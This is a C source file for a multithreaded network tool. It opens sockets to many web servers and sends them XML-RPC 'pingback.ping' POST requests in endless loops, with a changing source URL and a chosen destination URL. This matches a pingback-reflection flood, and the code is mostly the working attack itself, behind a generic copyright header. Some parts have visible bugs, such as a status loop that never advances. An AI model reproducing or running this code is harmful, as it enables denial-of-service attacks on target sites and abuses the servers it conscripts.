// **********************************************************************
//
// Copyright (c) 2003-2010 THP, Inc. All rights reserved.
//
// This copy of THP is licensed to you under the terms described in the
// THP_LICENSE file included in this distribution.
//
// **********************************************************************


#include "tool.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

#ifdef LINUX
    #include <fcntl.h>
    #include <netdb.h>
    #include <errno.h>
#elif WIN32
#endif




static char data_start[]=
"<methodCall>"
    "<methodName>pingback.ping</methodName>"
    "<params>"
       "<param>"
         "<value><string>\0";

static char data_middle[] =
"</string></value>"
       "</param>"
       "<param>"
         "<value><string>\0";

static char data_end[] = 
"</string></value>"
       "</param>"
    "</params>"
 "</methodCall>\0";

#define SERVPORT 80

struct range{
	int start;
	int end;
};

static URL_RECORD * g_head = NULL;

static int g_count = 0;

static int current_idx = 0; 

static char * source = NULL;

static int source_len = 0;

static int g_random =  0;

static void create_socket(URL_RECORD * pR);

static void send_data(URL_RECORD * pR);

static void * send_request_thread(struct range * p_range);




void set_source_url(char * ps)
{
	if (ps ==NULL || *ps =='\0')
	{
		printf("[ERROR] source is empty\n");
		return;
	}
	source_len = strlen(ps)+1;
	source = (char *) malloc(source_len);
	memset(source, 0, source_len);
	memcpy(source, ps, source_len-1);
	source[source_len-1] ='\0';
}

int set_url_records(int count)
{
	
		release_url_records();

	   g_head = (URL_RECORD *) malloc(sizeof(URL_RECORD) * count);
	   memset(g_head, 0, sizeof(URL_RECORD) * count);
	   	if(g_head == NULL)
		{
			return 1;
		}		

	g_count = count;
	
	return 0;
}


void release_url_records()
{
	if (g_head != NULL)
	{
        URL_RECORD * head = g_head;
		while(g_count-- > 0)
		{
			URL_RECORD *  p_record = head++;
			if(  p_record  != NULL)
			{
				if( p_record->host_name != NULL)
				{
					free(p_record->host_name);
                    p_record->host_name = NULL;
				}
				if( p_record->send_url != NULL)
				{
					free(p_record->send_url);
                    p_record->send_url = NULL;
				}
				if( p_record->dst_url != NULL)
				{
					free( p_record->dst_url);
                    p_record->dst_url = NULL;
				}
				if( p_record->context != NULL)
				{
					free(p_record->context);
                    p_record->context = NULL;
				}
				if(p_record->host != NULL)
				{
					free(p_record->host);
					p_record->host = NULL;
				}

                if(p_record->fd>=0)
                {
                    close(p_record->fd);
                    p_record->fd = -1;
                }
			}
		}
        free(g_head);
	}
	g_head = NULL;
	g_count = 0;
	current_idx = 0;
}

void add_record(char * record)
{
	if (record == NULL || *record =='\0')
	{
		return;
	}

	if(current_idx >= g_count)
	{
		printf("[ERROR] can't add new reocrd, because over cache size.\n");
		return;
	}

    char * send_url = NULL;
    char * dst_url = NULL;
	char * tmp = record;
    int start_pos = 0;
    int end_pos = 1;
    int len = 0;
	while( *tmp++ != '\0')
	{
        switch(*tmp)
        {
            case ' ':
               if(end_pos - start_pos > 5)
               {
                    len = end_pos - start_pos +2;
                    char * url = (char *) malloc(len);
                    memcpy(url, &record[start_pos],len);
                    url[len-1] ='\0';
                    if (send_url == NULL)
                    {
                        send_url = url;
                    }
                    else
                    {
                        dst_url = url;
                        break;
                    }
                     
               }
               start_pos = end_pos;
               break;
            case '\n':
            {
                len = end_pos - start_pos +1;
                if(len > 5) {
                char * url = (char *) malloc(len);
                memcpy(url, &record[start_pos],len-2);
                url[len-1] ='\0';
                dst_url = url;
                }
                break;
            }
                
        }
        
        end_pos ++;
	}

    if(send_url == NULL || dst_url ==NULL)
    {
        printf("[ERROR] incorrect record: %s\n", record);
        return;
    }
	g_head[current_idx].send_url = send_url;
    // TODO get hostname
	g_head[current_idx].dst_url = dst_url;

    char  url[255];
    memset(url, 0, 255);
    memcpy(url, send_url, strlen(send_url));
    char * pch = NULL;
    pch = strstr(url, "http://");

    if(pch !=  NULL && *pch !='\0')
    {
        pch += 7;
        char * phstart = pch ;
        pch = strstr(pch, "/");
        if (pch ==NULL)
        {
            int len = strlen(phstart);
            char * hostname = (char * ) malloc(len+1);
            memset(hostname, 0, len+1);
            memcpy(hostname, phstart, len);
            hostname[len] ='\0';
            g_head[current_idx].host_name = hostname;

            char * context = (char * )malloc(2);
            memset(context, 0, 2);
            context[0] ='/';
            context[1] = '\0';
            g_head[current_idx].context = context;
        }
        else
        {
        *pch ='\0';
        int len = strlen(phstart);
        char * hostname = (char * ) malloc(len+1);
        memset(hostname, 0, len+1);
        memcpy(hostname, phstart, len);
        hostname[len] ='\0';
        
        g_head[current_idx].host_name = hostname;

        *pch='/';
        len = strlen(pch);
        char * context = (char * )malloc(len +1);
        memset(context, 0, len+1);
        memcpy(context, pch+1, len-1);
        context[len] = '\0';
        g_head[current_idx].context = context;
        }
    }
   
    printf("======= record count:%d, %d    %s   %s \n", g_count, current_idx, g_head[current_idx].host_name, g_head[current_idx].dst_url);
    current_idx++;
}

// this function run understand pthread
static void * examine_host(URL_RECORD * pR)
{
    char * p_host_name = NULL;
    struct addrinfo hints;
    struct addrinfo *result = NULL;
    int ret;
    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_CANONNAME;
    hints.ai_protocol = 0;  

    if (pR == NULL)
    {
        printf("[ERROR] incorrect record\n");
        return NULL;
    }
    
    if (pR->host_name == NULL || *(pR->host_name) =='\0')
    {
	printf("[ERROR] incorrect host_name  %s  %d\n",pR->host_name, pR);
	return NULL;
    }
    if (pR->is_tested == TESTED || pR->is_tested == TESTING)
    {
        return NULL;
    }
    pR->is_tested = TESTING;
    
#ifdef LINUX
	//TODO calculate cost
    ret = getaddrinfo(pR->host_name, NULL, &hints, &result);
    if (ret != 0 || result == NULL)
    {
        printf("[ERROR] can't get host: %s   err:%d   %s\n",pR->host_name, ret, gai_strerror(ret));
    	pR->is_tested = TESTED;
	return NULL;
    }

    char buf[100];
    memset(buf, 0, sizeof(buf));
    ret = getnameinfo(result->ai_addr, result->ai_addrlen, buf, sizeof(buf), NULL, 0, NI_NUMERICHOST);
    if (ret == 0)
    {
         char * h = (char *) malloc(strlen(buf)+1);
         memcpy(h, buf, strlen(buf));
         h[strlen(buf)] ='\0';
         pR->host = h;
        create_socket(pR);// host);
    } else {
	printf("[ERROR] can't get host:%s\n", pR->host_name);
        return;
    }
#endif
    pR->is_tested = TESTED;
    
    return NULL;
}


void start_test()
{
   printf("[INFO] preparing sock, it takes some minutes.\n");
   URL_RECORD * head = g_head;
   int c = g_count; 
    while(c-->0)
    {
        pthread_t tid;
        pthread_create(&tid, NULL, examine_host,(void *) head++);
	if (c % 20 ==0 && c>0)
	{
#ifdef LINUX
        sleep(20);
#endif
	}
    }
    
    while(1)
    {
	int flag = 0;
   	URL_RECORD * head = g_head;
   	int c = g_count; 
    	while(c-->0)
    	{
		if(head->is_tested == TESTING || head->is_tested == NOT_START)
		{
			flag = 1;
			break;
		}
    	}
	if(flag)
	{
		sleep(3);
	}
	else
	{
		break;
	}
    } 
   printf("[INFO] finished connect preparing\n");
}

static void create_socket(URL_RECORD * pR)
{
    if(pR == NULL || pR->host == NULL || *(pR->host)=='\0')//|| host == NULL)
    {
        printf("[ERROR] incorrect parameter\n");
        return;
    }
    int sockfd;
#ifdef LINUX
    struct sockaddr_in serv_addr;
    if ((sockfd = socket(AF_INET, SOCK_STREAM,0)) == -1) {
        printf("can't crreate socket error :%d\n", errno);
        pR->is_opened = NOT_OPENED;
        pR->is_avl = UNAVAILABLE;
        return;
    }

    bzero(&serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(SERVPORT);
   
    serv_addr.sin_addr.s_addr = inet_addr(pR->host); 

    
    if (connect(sockfd, (struct sockaddr *)&serv_addr, \
               sizeof(struct sockaddr)) == -1) {
       printf("can't connect to url:%s,  errno:%d\n",pR->host_name, errno);
       close(sockfd);
       return;
    }

    int current = fcntl(sockfd, F_GETFL);
    fcntl(sockfd, F_SETFL, O_NONBLOCK | current);
   
    printf("[INFO] saved sock %s:%d  \n", pR->host_name, sockfd);
    pR->fd = sockfd;
    pR->is_opened = OPENED;
    pR->is_avl = AVAILABLE;

#endif
}


void start_shoot()
{
	int range = 0; 
	if(g_count < RECORDS_PER_THREAD)
	{
		range = 1;
	}
        else
	{
		range = g_count / RECORDS_PER_THREAD +(g_count % RECORDS_PER_THREAD ==0? 0:1);
	} 

	int i=0;
	printf("===== start shoot  %d\n", range);
	for(; i < range; i++)
	{
        	pthread_t tid;
		struct range * pr =(struct range *)malloc(sizeof(struct range));
		pr->start = i * RECORDS_PER_THREAD;
		if( i + 1== range)
		{
			pr->end = g_count;
		}
		else
		{
			pr->end = (i+1) * RECORDS_PER_THREAD;
		}
		printf("===== start%d   end %d\n", pr->start, pr->end);
        	pthread_create(&tid, NULL, send_request_thread, (void *)pr);
		
	}
}

static void * send_request_thread(struct range * p_range)
{
	printf("[INFO] start thread\n");
	if (p_range == NULL)
	{
		printf("[ERROR] incorrect parameter\n");
		return;
	}
	int start = p_range->start;
	int end = p_range->end;
	if(start<0 || end > g_count)
	{
		printf("[ERROR] incorrect range [%d-%d]\n", start, end);
		return;
	}
	while(1)
	{
		int i = start;
		int mod = 0;
		for(; i< end; i++, mod++)
		{
			URL_RECORD * pR = &g_head[i];
			if(pR !=NULL)
			{
				send_data(pR);
      				usleep(30);
			}
			if(mod - 30 == 0)
			{
				mod = 0;
      				usleep(30000);
			}
		}
		
	}
	
}

static void send_data(URL_RECORD * pR)
{
    char * header = NULL;
   char * data =NULL;
    g_random++;
    if(pR == NULL)
    {
	printf("[ERROR]%s Incorrect parameter\n",__FUNCTION__);
	return;
    }

    if(pR->fd <0 || pR->is_opened != OPENED || pR->is_avl != AVAILABLE)
    {
	    printf("[ERROR]%s socket doesn't open    %d    %d   %d \n",__FUNCTION__, pR->fd, pR->is_opened, pR->is_avl);
	//TODO open socket
	    return;
    }
    if(source == NULL || *source =='\0')
    {
	printf("[ERROR] no source url \n");
	return;
    }

   int s_len = strlen(data_start) ;
   int m_len = strlen(data_middle) ;
   int e_len = strlen(data_end) ;
   int dst_len = strlen(pR->dst_url) ;
   int total_len = s_len + source_len + 10 + m_len + dst_len + e_len;
   
   
   data = (char *) malloc(total_len);
   memset(data, 0, total_len);

   sprintf(data, "%s%s%d%s%s%s",data_start, source, g_random, data_middle, pR->dst_url, data_end); 

   header = (char *) malloc(4000);
   sprintf(header, "POST %s HTTP/1.1\r\n"
		   "HOST:%s\r\nUser-Agent: Mozilla/5.0(Linux)\r\n"
		   "Accept: text/html, application/xhtml+xml\r\n"
                   "Connection: keep-alive\r\n"
		   "Content-Length: %d \r\n\r\n%s"
		    , pR->context,pR->host_name, strlen(data), data);

//   int r = write(pR->fd, header, strlen(header));
   int r = send(pR->fd, header, strlen(header), MSG_DONTWAIT);
   printf("[INFO] fd:%d   ret:%d   errno:%d\n", pR->fd, r, errno);
   free(data);
   free(header);
}
